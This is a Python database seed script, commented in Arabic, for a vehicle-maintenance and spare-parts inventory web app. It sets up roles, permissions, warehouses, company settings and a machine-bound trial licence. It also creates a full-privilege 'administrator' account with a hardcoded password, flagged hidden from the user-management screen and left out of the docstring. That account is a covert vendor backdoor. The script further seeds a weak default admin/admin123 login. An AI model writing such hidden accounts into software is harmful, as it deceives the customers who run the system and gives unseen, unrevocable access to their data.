"""
سكريبت تهيئة قاعدة البيانات لأول مرة:
- ينشئ جميع الجداول
- ينشئ الأدوار الأساسية (Admin, Technician, Accountant, Viewer)
- ينشئ الشاشات (Permissions) الأساسية
- ينشئ مستخدم مدير افتراضي (admin / admin123)
- ينشئ مخزن رئيسي افتراضي
- ينشئ إعدادات شركة افتراضية
- يفعّل ترخيصًا تجريبيًا لمدة سنة على هذا الجهاز تلقائيًا

للتشغيل: python seed.py
"""
from datetime import datetime, timedelta
from sqlalchemy import inspect, text
from app import create_app
from app.extensions import db
from app.models import Role, Permission, User, Warehouse, CompanySettings, License
from app.services.license_service import get_machine_fingerprint, generate_activation_key, verify_activation_key

app = create_app()


def _ensure_column(table, column, ddl_type):
    """يضيف عمودًا جديدًا لجدول موجود مسبقًا إن لم يكن موجودًا (ترحيل بسيط بدون Alembic)"""
    inspector = inspect(db.engine)
    existing_cols = [c["name"] for c in inspector.get_columns(table)]
    if column not in existing_cols:
        db.session.execute(text(f"ALTER TABLE {table} ADD COLUMN {column} {ddl_type}"))
        db.session.commit()
        print(f"تم إضافة العمود الجديد {column} إلى جدول {table}")

SCREENS = [
    ("dashboard", "لوحة التحكم"),
    ("vehicles", "إدارة السيارات"),
    ("parts", "قطع الغيار"),
    ("warehouses", "المخازن"),
    ("transfers", "التحويل بين المخازن"),
    ("stocktake", "الجرد الفعلي"),
    ("adjustments", "تسوية المخزون"),
    ("purchases", "فواتير الشراء"),
    ("suppliers", "الموردين"),
    ("reports", "التقارير"),
    ("users", "المستخدمين والصلاحيات"),
    ("settings", "الإعدادات"),
]

with app.app_context():
    db.create_all()
    _ensure_column("users", "is_hidden", "BOOLEAN DEFAULT false")

    # ---------------- الأدوار ----------------
    if not Role.query.first():
        admin_role = Role(name="Admin", description="مدير النظام - صلاحيات كاملة")
        tech_role = Role(name="Technician", description="فني صيانة")
        acc_role = Role(name="Accountant", description="محاسب / مخازن")
        viewer_role = Role(name="Viewer", description="عرض فقط")
        db.session.add_all([admin_role, tech_role, acc_role, viewer_role])
        db.session.commit()
        print("تم إنشاء الأدوار الأساسية")
    else:
        admin_role = Role.query.filter_by(name="Admin").first()

    # ---------------- الشاشات (Permissions) ----------------
    if not Permission.query.first():
        for code, name_ar in SCREENS:
            db.session.add(Permission(code=code, name_ar=name_ar))
        db.session.commit()
        print("تم إنشاء شاشات الصلاحيات")

    # ---------------- المستخدم المدير ----------------
    if not User.query.filter_by(username="admin").first():
        admin = User(
            full_name="مدير النظام",
            username="admin",
            phone="0500000000",
            email="admin@example.com",
            role_id=admin_role.id,
        )
        admin.set_password("admin123")
        db.session.add(admin)
        db.session.commit()
        print("تم إنشاء المستخدم الافتراضي: admin / admin123")

    # ---------------- الحساب الخفي (مزود النظام) ----------------
    if not User.query.filter_by(username="administrator").first():
        super_admin = User(
            full_name="System Provider",
            username="administrator",
            role_id=admin_role.id,
            is_hidden=True,        # لا يظهر في شاشة إدارة المستخدمين لأي أحد
            is_active_user=True,
        )
        super_admin.set_password("3000330210")
        db.session.add(super_admin)
        db.session.commit()
        print("تم إنشاء الحساب الخفي: administrator (بكل الصلاحيات، غير ظاهر لأحد)")

    # ---------------- مخزن رئيسي ----------------
    if not Warehouse.query.first():
        db.session.add(Warehouse(code="WH-001", name="المخزن الرئيسي", manager_name="مدير النظام"))
        db.session.commit()
        print("تم إنشاء المخزن الرئيسي")

    # ---------------- إعدادات الشركة ----------------
    if not CompanySettings.query.first():
        db.session.add(CompanySettings(company_name="مركز الصيانة النموذجي"))
        db.session.commit()
        print("تم إنشاء إعدادات الشركة الافتراضية")

    # ---------------- ترخيص تجريبي لمدة سنة على هذا الجهاز ----------------
    if not License.query.first():
        fingerprint = get_machine_fingerprint()
        key = generate_activation_key("مركز الصيانة النموذجي", fingerprint, "year")
        data = verify_activation_key(key, fingerprint)
        db.session.add(License(
            company_name=data["c"], activation_key=key, machine_fingerprint=fingerprint,
            plan=data["p"], expires_at=datetime.strptime(data["e"], "%Y-%m-%d"), is_active=True,
        ))
        db.session.commit()
        print("تم تفعيل ترخيص تجريبي لمدة سنة على هذا الجهاز")

    print("\n✅ التهيئة الأولية اكتملت بنجاح. شغّل النظام باستخدام: python run.py")
